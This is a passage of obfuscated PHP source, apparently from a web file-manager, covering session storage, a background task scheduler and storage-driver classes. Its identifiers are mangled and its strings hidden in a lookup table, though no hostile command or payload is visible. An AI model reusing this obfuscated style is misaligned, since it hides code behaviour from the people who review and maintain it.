$®ğÌµù[241]: $ş¯ĞÕ[$®ğÌµù[97]] = $ş¯ĞÕ[$®ğÌµù[97]] . $®ğÌµù[1768]; self::$handle = new CacheFile($ş¯ĞÕ, $™’Ôú¢); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $šùñÒÂ = new self(); return $šùñÒÂ; } public static function getBySign($¼Ø«Ï—¸) { $ºà¯£ÖÜ = self::$handle->get($¼Ø«Ï—¸); $ºà¯£ÖÜ = unserialize($ºà¯£ÖÜ); return is_array($ºà¯£ÖÜ) ? $ºà¯£ÖÜ : array(); } public static function setBySign($ÂæãÇ¹´, $›€è ”İ) { CacheLock::lock($ÂæãÇ¹´); self::$handle->set($ÂæãÇ¹´, serialize($›€è ”İ), self::$sessionTime); CacheLock::unlock($ÂæãÇ¹´); } public static function sign($ïâÊı²æ = false) { if ($ïâÊı²æ) { self::$sessionSign = $ïâÊı²æ; } self::init(); return self::$sessionSign; } public static function set($Œî©‚´, $š‰œ‹Ó« = false) { self::init(); if (is_array($Œî©‚´)) { foreach ($Œî©‚´ as $¸š¦‰œß => $Ş£åšÄ) { array_set_value(self::$data, $¸š¦‰œß, $Ş£åšÄ); } } else { array_set_value(self::$data, $Œî©‚´, $š‰œ‹Ó«); } self::setBySign(self::$sessionSign, self::$data); } public static function get($² šÃŠ = false) { self::init(); if (!$² šÃŠ) { return self::$data; } return array_get_value(self::$data, $² šÃŠ); } public static function remove($ËÚ³Ãì) { self::init(); unset(self::$data[$ËÚ³Ãì]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[‰‰Ş‚€][941])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $É•Œ¹¯ş =& $_SERVER[‰‰Ş‚€]; if (self::valueGet($É•Œ¹¯ş[846]) != $É•Œ¹¯ş[101]) { return; } if (self::valueGet($É•Œ¹¯ş[1769]) == $É•Œ¹¯ş[101]) { $¡ÎÏìõÃ = self::valueGet($É•Œ¹¯ş[1770]); if (time() - $¡ÎÏìõÃ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($É•Œ¹¯ş[1769], $É•Œ¹¯ş[101]); self::log($É•Œ¹¯ş[1771] . ACTION . $É•Œ¹¯ş[1772]); Hook::bind($É•Œ¹¯ş[1773], $É•Œ¹¯ş[1774]); $ğú¦‚Ü = 0; while (!0) { self::cacheClear(); if (self::valueGet($É•Œ¹¯ş[846]) != $É•Œ¹¯ş[101]) { self::valueSet($É•Œ¹¯ş[1769], $É•Œ¹¯ş[239]); self::log($É•Œ¹¯ş[1775]); die; } $Ç£ç¸Ä× = time(); if ($Ç£ç¸Ä× - $ğú¦‚Ü >= 60) { self::valueSet(array($É•Œ¹¯ş[1769] => $É•Œ¹¯ş[101], $É•Œ¹¯ş[1770] => $Ç£ç¸Ä×)); $ğú¦‚Ü = $Ç£ç¸Ä×; } if (!file_exists(USER_SYSTEM . $É•Œ¹¯ş[1776])) { self::valueSet(array($É•Œ¹¯ş[1769] => $É•Œ¹¯ş[239], $É•Œ¹¯ş[846] => $É•Œ¹¯ş[239])); self::log($É•Œ¹¯ş[1777]); die; } $®È«½ûõ = file_get_contents(BASIC_PATH . $É•Œ¹¯ş[1778]); $Š„øš¯î = KOD_VERSION . $É•Œ¹¯ş[20] . KOD_VERSION_BUILD; $æãÏ„ãÄ = match_text($®È«½ûõ, $É•Œ¹¯ş[1779]) . $É•Œ¹¯ş[20] . match_text($®È«½ûõ, $É•Œ¹¯ş[1780]); if ($æãÏ„ãÄ != $Š„øš¯î) { self::restart(); self::log("\x73\x74\157\x70\145\144\56\x5b\166\x65\x72\163\x69\157\156\x20\165\160\144\x61\x74\x65\73{$versionNow}\40\75\x3e\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $‰ĞêşÉ¡ =& $_SERVER[‰‰Ş‚€]; http_close(); $GLOBALS[$‰ĞêşÉ¡[1781]] = 1; $_SERVER[$‰ĞêşÉ¡[1782]] = $‰ĞêşÉ¡[1783]; $_COOKIE = array(); $GLOBALS[$‰ĞêşÉ¡[1784]] = 1; $GLOBALS[$‰ĞêşÉ¡[1785]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $·ÖÏ×ŒÂ =& $_SERVER[‰‰Ş‚€]; http_close(); self::valueSet($·ÖÏ×ŒÂ[846], $·ÖÏ×ŒÂ[239]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($·ÖÏ×ŒÂ[1769] => $·ÖÏ×ŒÂ[239], $·ÖÏ×ŒÂ[846] => $·ÖÏ×ŒÂ[101])); self::log($·ÖÏ×ŒÂ[1786]); } public static function taskSwitch() { $¦úÜ½Ë =& $_SERVER[‰‰Ş‚€]; $ö„¥é¢ = self::valueGet($¦úÜ½Ë[846]) == $¦úÜ½Ë[101] ? $¦úÜ½Ë[239] : $¦úÜ½Ë[101]; self::valueSet($¦úÜ½Ë[846], $ö„¥é¢); } public static function shutdownEvent() { $—Ÿ›çşÂ =& $_SERVER[‰‰Ş‚€]; self::valueSet($—Ÿ›çşÂ[1769], $—Ÿ›çşÂ[239]); self::log($—Ÿ›çşÂ[1787]); } public static function config($’šÊ¦€², $„ñ«Û¹) { self::valueSet($_SERVER[‰‰Ş‚€][846], $’šÊ¦€²); } private static function taskRunAll() { $êÜ¨Ò– =& $_SERVER[‰‰Ş‚€]; $öŠÓÕî = timeFloat(); $»ëı·Øó = Model($êÜ¨Ò–[1788])->listData(); $úÓƒŒÖÁ = count($»ëı·Øó); for ($º­ÀçŞ³ = 0; $º­ÀçŞ³ < $úÓƒŒÖÁ; $º­ÀçŞ³++) { $¶ÜØÂı¦ = $»ëı·Øó[$º­ÀçŞ³]; if (!$¶ÜØÂı¦[$êÜ¨Ò–[491]] || $¶ÜØÂı¦[$êÜ¨Ò–[1789]] != $êÜ¨Ò–[101]) { continue; } if (!self::taskTimeCheck($¶ÜØÂı¦)) { continue; } self::taskRun($¶ÜØÂı¦); } Hook::trigger($êÜ¨Ò–[1790]); self::taskQueueRun($öŠÓÕî); } private static function taskQueueRun($ÒÚ‹·å±) { $ªùşûêÎ = 10; while (!0) { $âÂ„¨ùõ = TaskQueue::run(); if ($âÂ„¨ùõ === !1) { break; } if (timeFloat() - $ÒÚ‹·å± >= $ªùşûêÎ) { break; } } } private static function taskTimeCheck($¥îÉêç©) { $øĞø…€Ò =& $_SERVER[‰‰Ş‚€]; $Ù´áª¼à = json_decode($¥îÉêç©[$øĞø…€Ò[215]], !0); $«²ñ÷÷ = intval($¥îÉêç©[$øĞø…€Ò[1770]]); $ãç£Ï’ú = strtotime($øĞø…€Ò[1791] . $Ù´áª¼à[$øĞø…€Ò[1792]] . $øĞø…€Ò[1793]) - strtotime($øĞø…€Ò[1794]); $îÎøãÉÖ = time() - strtotime(date($øĞø…€Ò[1795]) . $øĞø…€Ò[1796]); $­úöíãÀ = $îÎøãÉÖ >= $ãç£Ï’ú && $îÎøãÉÖ <= $ãç£Ï’ú + 3600; switch ($Ù´áª¼à[$øĞø…€Ò[43]]) { case $øĞø…€Ò[1797]: if (time() - $«²ñ÷÷ < 3600 * 24 * 30) { return !1; } if ($Ù´áª¼à[$øĞø…€Ò[1797]] == date($øĞø…€Ò[1798]) && $­úöíãÀ) { return !0; } break; case $øĞø…€Ò[1799]: if (time() - $«²ñ÷÷ < 3600 * 24 * 7) { return !1; } $ûé ”³² = date($øĞø…€Ò[1800]) == 0 ? 7 : date($øĞø…€Ò[1800]); if ($Ù´áª¼à[$øĞø…€Ò[1799]] == $ûé ”³² && $­úöíãÀ) { return !0; } break; case $øĞø…€Ò[1792]: if (time() - $«²ñ÷÷ < 3600 * 24) { return !1; } if ($­úöíãÀ) { return !0; } break; case $øĞø…€Ò[1801]: if (time() - $«²ñ÷÷ >= floatval($Ù´áª¼à[$øĞø…€Ò[1801]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ûáçç®­ =& $_SERVER[‰‰Ş‚€]; static $î ³§« = 0; $ãùÙí”› = 300; if (!$î ³§«) { $î ³§« = time(); } if (time() - $î ³§« < $ãùÙí”›) { return; } $î ³§« = time(); $€ìŞöÁ† = Model($ûáçç®­[597])->db($ûáçç®­[22]); if ($€ìŞöÁ†) { $€ìŞöÁ†->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ûáçç®­[1802], $ûáçç®­[1803]); die; } } public static function taskRun($®Œ˜İ€¯) { $Şíº×ç« =& $_SERVER[‰‰Ş‚€]; self::log($Şíº×ç«[1804] . $®Œ˜İ€¯[$Şíº×ç«[491]] . $Şíº×ç«[1805] . $®Œ˜İ€¯[$Şíº×ç«[42]] . $Şíº×ç«[1806] . $®Œ˜İ€¯[$Şíº×ç«[1807]]); Model($Şíº×ç«[1788])->run($®Œ˜İ€¯[$Şíº×ç«[491]]); $åù½º‚º = timeFloat(); $ÆËÚÀã½ = $Şíº×ç«[22]; switch ($®Œ˜İ€¯[$Şíº×ç«[43]]) { case $Şíº×ç«[391]: $ûúæÀ‚° = url_request($®Œ˜İ€¯[$Şíº×ç«[1807]], $Şíº×ç«[1542], !1, !1, !1, !1, 10); if ($ûúæÀ‚°[$Şíº×ç«[846]]) { $ÆËÚÀã½ = strlen($ûúæÀ‚°[$Şíº×ç«[1326]]); } break; case $Şíº×ç«[1808]: $ÆËÚÀã½ = Hook::apply($®Œ˜İ€¯[$Şíº×ç«[1807]]); default: break; } Model($Şíº×ç«[1809])->add(array($Şíº×ç«[1810] => $Şíº×ç«[22], $Şíº×ç«[1811] => $Şíº×ç«[239], $Şíº×ç«[43] => $Şíº×ç«[1812] . $®Œ˜İ€¯[$Şíº×ç«[491]], $Şíº×ç«[1813] => json_encode(array($Şíº×ç«[42] => $®Œ˜İ€¯[$Şíº×ç«[42]], $Şíº×ç«[1814] => timeFloat() - $åù½º‚º, $Şíº×ç«[852] => $ÆËÚÀã½)))); $šƒÈ´Ëõ = $ÆËÚÀã½ ? $Şíº×ç«[1815] . $ÆËÚÀã½ : $Şíº×ç«[22]; self::log($Şíº×ç«[1816] . $®Œ˜İ€¯[$Şíº×ç«[491]] . $Şíº×ç«[186] . $šƒÈ´Ëõ); return !0; } public static function valueGet($û‰İúØ) { $ÌØñÙ«¡ =& $_SERVER[‰‰Ş‚€]; $·™·€óª = $ÌØñÙ«¡[1817]; $íİÓ˜ÍŠ = Model($ÌØñÙ«¡[526])->get($û‰İúØ, $·™·€óª); if (is_null($íİÓ˜ÍŠ)) { Model($ÌØñÙ«¡[526])->set($ÌØñÙ«¡[846], $ÌØñÙ«¡[101], $·™·€óª); Model($ÌØñÙ«¡[526])->set($ÌØñÙ«¡[1769], $ÌØñÙ«¡[239], $·™·€óª); $íİÓ˜ÍŠ = Model($ÌØñÙ«¡[526])->get($û‰İúØ, $·™·€óª); } return $íİÓ˜ÍŠ; } private static function valueSet($¾€ùó©×, $ÓÃ—Íñ = false) { $ªş«å’Ÿ =& $_SERVER[‰‰Ş‚€]; $´àÏÊĞä = $ªş«å’Ÿ[1818]; CacheLock::lock($´àÏÊĞä); $Ô²ı½Œ» = Model($ªş«å’Ÿ[526])->set($¾€ùó©×, $ÓÃ—Íñ, $ªş«å’Ÿ[1817]); CacheLock::unlock($´àÏÊĞä); return $Ô²ı½Œ»; } protected static function log($»Œšáˆ) { write_log($»Œšáˆ, $_SERVER[‰‰Ş‚€][1803]); } private static function cacheClear() { $„É‘øÕ =& $_SERVER[‰‰Ş‚€]; Cache::clearMemory(Model($„É‘øÕ[526])->cacheKey($„É‘øÕ[1817])); Cache::clearMemory(Model($„É‘øÕ[526])->cacheKey($„É‘øÕ[1819])); Model($„É‘øÕ[1788])->cacheClear(); self::closeDatabase(); } } goto Dó˜êÉ¶¢÷; D£ø”÷ïŸÅ: class PathDriverBOS extends PathDriverS3 { public function __construct($›åû£© ) { parent::__construct($›åû£© ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($çİÌÌµğ) { parent::__construct($çİÌÌµğ); $this->setSignVersion($_SERVER[‰‰Ş‚€][258]); } public function uploadFormData($Êœ¦ôä, $¾ÈŞÑ = 3600) { $æûÉ††ã =& $_SERVER[‰‰Ş‚€]; $öÏ›ëåõ = $æûÉ††ã[240]; $¬êÙôáŒ = $æûÉ††ã[1458]; $ô®‹ªéë = $æûÉ††ã[272]; $ÀæÅ‹µ‰ = gmdate($æûÉ††ã[1459], time() + $¾ÈŞÑ); $ÀñÔıÌñ = (string) time() . $æûÉ††ã[84] . (string) (time() + $¾ÈŞÑ); $õ‰…ğµÅ = array($æûÉ††ã[273] => $ÀæÅ‹µ‰, $æûÉ††ã[276] => array(array($æûÉ††ã[316] => $öÏ›ëåõ), array($æûÉ††ã[277] => $this->bucket), array($æûÉ††ã[278], $æûÉ††ã[279], $æûÉ††ã[22]), array($æûÉ††ã[281] => $ô®‹ªéë), array($æûÉ††ã[1460] => $¬êÙôáŒ), array($æûÉ††ã[1461] => $this->accessKey), array($æûÉ††ã[1462] => $ÀñÔıÌñ))); $õ‰…ğµÅ = json_encode($õ‰…ğµÅ); $ÈıƒÁ˜ = hash_hmac($æûÉ††ã[1458], $ÀñÔıÌñ, $this->secret); $ØŠ—•ÀÕ = sha1($õ‰…ğµÅ); $æ¢¢áÂû = hash_hmac($æûÉ††ã[1458], $ØŠ—•ÀÕ, $ÈıƒÁ˜); $’ïÒÃ«¨ = array($æûÉ††ã[316] => $öÏ›ëåõ, $æûÉ††ã[281] => $ô®‹ªéë, $æûÉ††ã[288] => base64_encode($õ‰…ğµÅ), $æûÉ††ã[1460] => $¬êÙôáŒ, $æûÉ††ã[1461] => $this->accessKey, $æûÉ††ã[1463] => $ÀñÔıÌñ, $æûÉ††ã[1464] => $æ¢¢áÂû, $æûÉ††ã[217] => $this->getHost()); return $’ïÒÃ«¨; } public function fileOutImage($Öšúñ , $Íâ‘ç¾ = 250) { $ùŸ‹íèÛ =& $_SERVER[‰‰Ş‚€]; if ($this->size($Öšúñ ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Öšúñ , $Íâ‘ç¾); } $ü†¶¦ßû = $this->link($Öšúñ ); $ü†¶¦ßû .= $ùŸ‹íèÛ[1465] . $Íâ‘ç¾ . $ùŸ‹íèÛ[1466]; $this->fileOutLink($ü†¶¦ßû); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Å·ˆ»±ñ) { $this->pathParse = $Å·ˆ»±ñ; $this->model = Model($_SERVER[‰‰Ş‚€][1467]); } public function getPath($•‡¹Ùú™) { return trim($•‡¹Ùú™, $_SERVER[‰‰Ş‚€][18]); } public function pathFather($Âû¥ËÔ‰) { $Š®¦¥»Å = $this->parse($Âû¥ËÔ‰); $Š®¦¥»Å = $this->infoSimple($Âû¥ËÔ‰); return $Š®¦¥»Å ? $Š®¦¥»Å[$_SERVER[‰‰Ş‚€][201]] : !1; } public function pathThis($ªåÒ²‰Ä) { $¢çÁÖªÌ = $this->infoSimple($ªåÒ²‰Ä); return $¢çÁÖªÌ ? $¢çÁÖªÌ[$_SERVER[‰‰Ş‚€][42]] : !1; } public function getPathOuter($²»“ÀÕò) { if (!$²»“ÀÕò) { return $²»“ÀÕò; } $Ÿõ×ğÙ¦ = $this->parse($²»“ÀÕò); return KodIO::make($Ÿõ×ğÙ¦[$_SERVER[‰‰Ş‚€][491]]); } public function copyFolderFromIO($İ˜˜¥åÉ, $Œ£ü¤›, $Üı°âË°, $µ‘¥éŸ±, $İòÄï¹Ç) { $Ö†ŞÉüš = $this->model->copyFolderFromIO($İ˜˜¥åÉ, $Œ£ü¤›, $Üı°âË°, $µ‘¥éŸ±, $İòÄï¹Ç); return KodIO::make($Ö†ŞÉüš); } public function isParentOf($‹½å”ØÇ, $ÀÖ¦Şûü) { return $this->model->isParentOf($‹½å”ØÇ, $ÀÖ¦Şûü); } public function mkfile($„ƒ×Û°, $ü­¡§á = '', $í¤ºŞ¹Ÿ = REPEAT_RENAME) { $Ä…ˆ£Ñı =& $_SERVER[‰‰Ş‚€]; $¯¥‰¾££ = $this->parse($„ƒ×Û°); $„ƒ×Û° = $¯¥‰¾££[$Ä…ˆ£Ñı[491]]; for ($Ç©ø€Ê³ = 0; $Ç©ø€Ê³ < count($¯¥‰¾££[$Ä…ˆ£Ñı[1468]]); $Ç©ø€Ê³++) { $´óá±œ‚ = $¯¥‰¾££[$Ä…ˆ£Ñı[1468]][$Ç©ø€Ê³]; if ($Ç©ø€Ê³ == count($¯¥‰¾££[$Ä…ˆ£Ñı[1468]]) - 1) { $„ƒ×Û° = $this->model->mkfile($„ƒ×Û°, $´óá±œ‚, $ü­¡§á, $í¤ºŞ¹Ÿ); break; } $„ƒ×Û° = $this->model->mkdir($„ƒ×Û°, $´óá±œ‚, REPEAT_SKIP); } return $this->getPathOuter($„ƒ×Û°); } public function mkdir($øış‘, $ıÆ™Ø¡´ = REPEAT_SKIP) { $ü«êŞÈ =& $_SERVER[‰‰Ş‚€]; $¼õÕöÁ = $this->parse($øış‘); $øış‘ = $¼õÕöÁ[$ü«êŞÈ[491]]; for ($«™âÚ¢Æ = 0; $«™âÚ¢Æ < count($¼õÕöÁ[$ü«êŞÈ[1468]]); $«™âÚ¢Æ++) { $‘‹³ÄÖß = $¼õÕöÁ[$ü«êŞÈ[1468]][$«™âÚ¢Æ]; $øış‘ = $this->model->mkdir($øış‘, $‘‹³ÄÖß, $ıÆ™Ø¡´); } return $this->getPathOuter($øış‘); } public function copyFile($ÆòÏÁß€, $ï´«ˆÔ, $–ñ›Âå = REPEAT_REPLACE) { $¡óòŞÅš =& $_SERVER[‰‰Ş‚€]; $Õ’’Œ¨½ = $this->parse($ï´«ˆÔ); $ÜÛì¹ò¼ = $this->model->copy($ÆòÏÁß€, $Õ’’Œ¨½[$¡óòŞÅš[491]], $–ñ›Âå, $Õ’’Œ¨½[$¡óòŞÅš[97]]); return $ÜÛì¹ò¼ ? $this->getPathOuter($ÜÛì¹ò¼) : !1; } public function moveFile($çà®à—Õ, $®õëÍŠ¾, $µïš¿£“ = REPEAT_REPLACE) { $º¬²‡ =& $_SERVER[‰‰Ş‚€]; $ÃèŠàË = $this->parse($®õëÍŠ¾); $ ‘ß¬¬Á = $this->model->move($çà®à—Õ, $ÃèŠàË[$º¬²‡[491]], $µïš¿£“, $ÃèŠàË[$º¬²‡[97]]); return $ ‘ß¬¬Á ? $this->getPathOuter($ ‘ß¬¬Á) : !1; } public function copy($×ìÎœ, $ŒşÖ–ö, $¢¡¿ÃÏ¢ = REPEAT_REPLACE, $»™­ôú = false) { $ÜÁ®ÚÂµ = $this->parse($ŒşÖ–ö); $ØÚ¦± = $this->model->copy($×ìÎœ, $ÜÁ®ÚÂµ[$_SERVER[‰‰Ş‚€][491]], $¢¡¿ÃÏ¢, $»™­ôú); return $ØÚ¦± ? $this->getPathOuter($ØÚ¦±) : !1; } public function moveSameAllow() { } public function move($·™‚¼¡Ë, $ÊÈ¾ë¢, $‹ÉèàÓ´ = REPEAT_REPLACE, $öÜÈœß = false) { $™êÕß’‹ = $this->parse($ÊÈ¾ë¢); $š€ñó = $this->model->move($·™‚¼¡Ë, $™êÕß’‹[$_SERVER[‰‰Ş‚€][491]], $‹ÉèàÓ´, $öÜÈœß); return $š€ñó ? $this->getPathOuter($š€ñó) : !1; } public function remove($˜ûÊÔ¢¶, $ïşß¶ËÍ = true) { return $this->model->remove($˜ûÊÔ¢¶, $ïşß¶ËÍ); } public function rename($û ô¥„, $¨ê¦¾Òò) { $Ü™Û°¢° = $this->model->rename($û ô¥„, $¨ê¦¾Òò); return $Ü™Û°¢° ? $this->getPathOuter($û ô¥„) : $Ü™Û°¢°; } public function size($½ÑùÆîœ) { $¿¡­Ê¿Í = $this->infoSimple($½ÑùÆîœ); return $¿¡­Ê¿Í ? $¿¡­Ê¿Í[$_SERVER[‰‰Ş‚€][89]] : 0; } public function infoSimple($¼”×‡Ô) { return $this->model->sourceInfo($¼”×‡Ô); } public function info($Ùû¡ÒÂ) { return $this->infoParse($Ùû¡ÒÂ); } public function infoAuth($•Şñ‚šÜ) { return $this->infoParse($•Şñ‚šÜ, !1, !0); } public function infoWithChildren($Ş ¾œÛ›) { return $this->infoParse($Ş ¾œÛ›, !0); } protected function infoParse($œšÌ¨Óâ, $óÊÜİª™ = false, $ Æººïü = false) { if (!$óÊÜİª™) { return $this->model->pathInfo($œšÌ¨Óâ, $ Æººïü); } return $this->model->pathInfoMore($œšÌ¨Óâ); } public function infoFullSimple($×Î‹ÀÒ¸) { $çóƒ–ª =& $_SERVER[‰‰Ş‚€]; $¼ª€¦Î = explode($çóƒ–ª[18], $×Î‹ÀÒ¸); $™¼Ú÷‹ö = implode($çóƒ–ª[18], array_splice($¼ª€¦Î, 1)); return $this->model->pathInfoByPath($¼ª€¦Î[0], $™¼Ú÷‹ö); } public function infoFull($–ßˆğ«É) { $é¦ï¡ÅÃ = $this->infoFullSimple($–ßˆğ«É); return is_array($é¦ï¡ÅÃ) ? $this->model->pathInfo($é¦ï¡ÅÃ[$_SERVER[‰‰Ş‚€][202]]) : !1; } public function hashSimple($Ø‡´Î‹¿) { $ïİÊ¹®Ú =& $_SERVER[‰‰Ş‚€]; $¦Ø‚¶¹ë = $this->infoWithChildren($Ø‡´Î‹¿); return $¦Ø‚¶¹ë[$ïİÊ¹®Ú[178]][$ïİÊ¹®Ú[695]]; } public function hashMd5($˜¬˜¡‘¼) { $„Ú–ÜÔ =& $_SERVER[‰‰Ş‚€]; $÷®­Ê›§ = $this->infoWithChildren($˜¬˜¡‘¼); return $÷®­Ê›§[$„Ú–ÜÔ[178]][$„Ú–ÜÔ[567]]; } public function exist($•Ùäã¦Ë) { $šáŠïÇı =& $_SERVER[‰‰Ş‚€]; $ù“Ÿğ²æ = $this->parse($•Ùäã¦Ë); if (!$ù“Ÿğ²æ[$šáŠïÇı[97]]) { return $this->isFile($•Ùäã¦Ë) || $this->isFolder($•Ùäã¦Ë); } $’ÀŞ¯€Š = array($šáŠïÇı[496] => $ù“Ÿğ²æ[$šáŠïÇı[491]], $šáŠïÇı[42] => $ù“Ÿğ²æ[$šáŠïÇı[97]]); $™—ÇˆÏÃ = $this->model->where($’ÀŞ¯€Š)->find(); return $™—ÇˆÏÃ ? !0 : !1; } public function isFile($¬îËòÖ·) { $ò’«ıøî =& $_SERVER[‰‰Ş‚€]; $ÙúŞëÅ™ = $this->infoSimple($¬îËòÖ·); return $ÙúŞëÅ™ && $ÙúŞëÅ™[$ò’«ıøî[504]] == $ò’«ıøî[239] ? !0 : !1; } public function isFolder($üÊğ°‰) { $ï½²Æ§Â =& $_SERVER[‰‰Ş‚€]; $Í§±‰‡Ô = $this->infoSimple($üÊğ°‰); return $Í§±‰‡Ô && $Í§±‰‡Ô[$ï½²Æ§Â[504]] == $ï½²Æ§Â[101] ? !0 : !1; } public function listPath($ßÉ«­Ó, $±«¦ñëœ = false) { $ß¤©üÀß =& $_SERVER[‰‰Ş‚€]; if ($ßÉ«­Ó == $ß¤©üÀß[22]) { return !1; } $‘ß±îšµ = array($ß¤©üÀß[496] => $ßÉ«­Ó); if ($±«¦ñëœ) { return $this->model->listSource($‘ß±îšµ, -1); } return $this->model->listSource($‘ß±îšµ); } public function has($ØÙó±³Õ, $¹Ğ¡ÇĞã = false, $‡³·™ş = null) { $Ğ¿´û¾Ö =& $_SERVER[‰‰Ş‚€]; $èŒ» » = $this->infoWithChildren($ØÙó±³Õ); if ($¹Ğ¡ÇĞã) { return array($Ğ¿´û¾Ö[251] => $èŒ» »[$Ğ¿´û¾Ö[251]], $Ğ¿´û¾Ö[250] => $èŒ» »[$Ğ¿´û¾Ö[250]]); } return $‡³·™ş ? $èŒ» »[$Ğ¿´û¾Ö[251]] : $èŒ» »[$Ğ¿´û¾Ö[250]]; } public function listAll($İÄÎÉñ¦) { $ø ¥Äˆˆ = IO::info($this->pathParse[$_SERVER[‰‰Ş‚€][97]]); if (!$ø ¥Äˆˆ) { return array(); } return $this->model->listAll($İÄÎÉñ¦); } public function getContent($·¨´òğ) { return $this->model->getContent($·¨´òğ); } public function setContent($ÚŞóÕßÃ, $¶ä®Ã› = '') { return $this->model->setContent($ÚŞóÕßÃ, $¶ä®Ã›); } public function fileSubstr($°Å²Èêò, $·§¬Çƒ, $­àòóÖ) { return $this->model->fileSubstr($°Å²Èêò, $·§¬Çƒ, $­àòóÖ); } public function download($Õ±ê²¹Ë, $ìšÍ¦¿ö = '') { $ÔÎşè…Ê = get_path_father($ìšÍ¦¿ö); $äìŠ´ÖÑ = get_path_this($ìšÍ¦¿ö); $ı…Õ±˜ó = $this->model->fileInfoGet($Õ±ê²¹Ë); $†Üî‘”à = IO::copy($ı…Õ±˜ó[$_SERVER[‰‰Ş‚€][97]], $ÔÎşè…Ê, !1, $äìŠ´ÖÑ); return $†Üî‘”à; } public function setModifyTime($½¥•âî, $ñË‘¾—å = '') { $ŸÁÌÈÔ„ =& $_SERVER[‰‰Ş‚€]; if (!$½¥•âî) { return; } $this->model->where(array($ŸÁÌÈÔ„[510] => $½¥•âî))->save(array($ŸÁÌÈÔ„[98] => $ñË‘¾—å)); } public function upload($é™êí‰ò, $”×ıÇÏó, $¦Â÷‡Õ‚ = false, $Ê†ß‡¸‡ = REPEAT_REPLACE) { $–…ñ½ßè =& $_SERVER[‰‰Ş‚€]; $‰ÅøÛïö = $this->parse($é™êí‰ò); $Ãúˆ¦ê‚ = $this->model->addFile($‰ÅøÛïö[$–…ñ½ßè[491]], $”×ıÇÏó, $‰ÅøÛïö[$–…ñ½ßè[97]], $¦Â÷‡Õ‚, $Ê†ß‡¸‡); return $this->getPathOuter($Ãúˆ¦ê‚); } public function uploadFileByID($ó¾Ì˜”Ö, $…÷Ø§´É, $ÛÓ‚Ê˜) { $Íğ¾ßò =& $_SERVER[‰‰Ş‚€]; $ŸñÅ¬İ = $this->parse($ó¾Ì˜”Ö); $•…’‰À± = $this->model->addFileByFileID($ŸñÅ¬İ[$Íğ¾ßò[491]], $…÷Ø§´É, $ŸñÅ¬İ[$Íğ¾ßò[97]], $ÛÓ‚Ê˜); return $this->getPathOuter($•…’‰À±); } public function addFileByRemote($¢ÉØÊ¢‘, $“ëĞ¾û¦, $”¥¥¦àœ = array(), $Ø’æÄæ« = '', $ô™­»Ì) { $Ñãß¾Ÿå =& $_SERVER[‰‰Ş‚€]; $˜ÏˆØÕ  = $this->parse($¢ÉØÊ¢‘); $Ø’æÄæ« = empty($Ø’æÄæ«) ? $˜ÏˆØÕ [$Ñãß¾Ÿå[97]] : $Ø’æÄæ«; $Óƒ‘› = $this->model->addFileByRemote($˜ÏˆØÕ [$Ñãß¾Ÿå[491]], $“ëĞ¾û¦, $Ø’æÄæ«, $”¥¥¦àœ, $ô™­»Ì); return $this->getPathOuter($Óƒ‘›); } public function uploadLink($¹şªŸÎ’, $µ‰—âÀõ = 0) { $·ÃîäÎ› =& $_SERVER[‰‰Ş‚€]; $áÛÍßé = $this->parse($¹şªŸÎ’); $à®äÚÅÀ = _get($GLOBALS[$·ÃîäÎ›[17]], $·ÃîäÎ›[1469]); $¨õÀæè£ = _get($GLOBALS[$·ÃîäÎ›[17]], $·ÃîäÎ›[1470]); $¥şİ®ÆÈ = KodIO::ioFileDriverGet($·ÃîäÎ›[502] . $áÛÍßé[$·ÃîäÎ›[491]] . $·ÃîäÎ›[411]); $ŠÃ…¦¿¥ = Model($·ÃîäÎ›[697])->createFileName($áÛÍßé[$·ÃîäÎ›[97]], $¥şİ®ÆÈ, $à®äÚÅÀ, $¨õÀæè£); return IO::uploadLink($ŠÃ…¦¿¥, $µ‰—âÀõ); } public function fileNameAuto($ĞµÂ“™ş, $¢¦½Ò¨ã, $ƒ®ôÚ ‘ = REPEAT_REPLACE, $…¢š…è• = false) { return $this->model->fileNameAuto($ĞµÂ“™ş, $¢¦½Ò¨ã, $ƒ®ôÚ ‘, $…¢š…è•); } public function fileNameExist($Ì½´™Ø, $¶á¥¬¾æ) { return $this->model->fileNameExist($Ì½´™Ø, $¶á¥¬¾æ); } protected function _fileOut($Ú¯ÃÇì•, $˜Ï ³û = false, $Şëìãˆ¶ = false, $˜›ó„¿ô = '', $áÆú®©’ = false) { $ŠšÖèÍç =& $_SERVER[‰‰Ş‚€]; $äØ¹Éœ = $this->model->sourceInfo($Ú¯ÃÇì•); if ($äØ¹Éœ[$ŠšÖèÍç[504]] == $ŠšÖèÍç[101]) { header($ŠšÖèÍç[1471]); die; } $ºØŠŸÏª = $this->model->fileInfoGet($Ú¯ÃÇì•); $˜›ó„¿ô = $ºØŠŸÏª[$ŠšÖèÍç[567]] ? $ºØŠŸÏª[$ŠšÖèÍç[567]] : $˜›ó„¿ô; $²†Í¸Ü„ = isset($GLOBALS[$ŠšÖèÍç[191]]) && is_array($GLOBALS[$ŠšÖèÍç[191]]) ? $GLOBALS[$ŠšÖèÍç[191]][$ŠšÖèÍç[42]] : $äØ¹Éœ[$ŠšÖèÍç[42]]; if ($áÆú®©’) { return IO::fileOutServer($ºØŠŸÏª[$ŠšÖèÍç[97]], $˜Ï ³û, $²†Í¸Ü„, $˜›ó„¿ô); } IO::fileOut($ºØŠŸÏª[$ŠšÖèÍç[97]], $˜Ï ³û, $²†Í¸Ü„, $˜›ó„¿ô); } public function fileOut($ 